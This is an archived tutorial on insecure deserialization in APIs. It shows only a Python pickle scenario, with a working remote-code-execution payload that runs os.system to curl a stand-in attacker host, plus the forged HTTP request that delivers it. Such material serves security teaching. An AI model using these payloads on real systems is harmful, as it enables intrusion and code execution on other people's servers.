# Hacking APIs | Insecure Deserialization

- **Source URL:** https://medium.com/@aminefarah802/hacking-apis-1b809d9d5aa0?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250906004411/https://medium.com/@aminefarah802/hacking-apis-1b809d9d5aa0
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10034 (id 10034)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Hacking APIs | Insecure Deserialization

## Insecure Deserialization is a serious vulnerability that occurs when an API receives serialized data and deserializes it without verifying…

## Unsafe Data Deserialization: Risks and Exploitation Scenarios:

Unsafe data deserialization is a critical security flaw that arises when an API processes serialized data without proper validation. Attackers can exploit this weakness to inject malicious objects, execute arbitrary code, alter application logic, or tamper with sensitive data.

This guide demonstrates three real-world exploitation techniques across different programming environments — Python, Java, and Node.js — including actual HTTP interactions.

## Scenario 1: Python (Pickle-Based API Exploit):

`POST /api/v1/profile/upload_data`  The frontend submits profile data encoded in Base64 (Pickle format).

## Standard Request :

```
POST /api/v1/profile/upload_data  
Authorization: Bearer eyJhbGciOiJIUzI1Ni...  
Content-Type: application/json  
{  
  "data": "gASVJgAAAAAAAAB9lCiMB3VzZXJfaWSUjAMxMjOlLg=="  
}  
```
*Decoded payload:* `pickle.dumps({"user_id": "123"})`

## Expected Response :

```
{  
  "message": "User data loaded successfully",  
  "user_id": "123"  
}  
```
## Attack: Remote Code Execution :

```
import pickle, os, base64  
class MaliciousPayload:  
    def __reduce__(self):  
        return (os.system, ("curl http://attacker.tld?owned=1",))  
payload = base64.b64encode(pickle.dumps(MaliciousPayload()))  
print(payload.decode())  
```
## Malicious Request :

```
POST /api/v1/profile/upload_data  
Authorization: Bearer eyJhbGciOiJIUzI1Ni...  
Content-Type: application/json  
{  
  "data": "gASVOQAAAAAAAAB9lIwIRXhwbG9pdJSMB29zLnN5c3RlbZSTlJOUKZQu"  
}  
```
## Server Impact :

The API deserializes the payload, executing:

`curl http://attacker.tld?owned=1`  *No visible response, but the attacker’s server logs the request.*
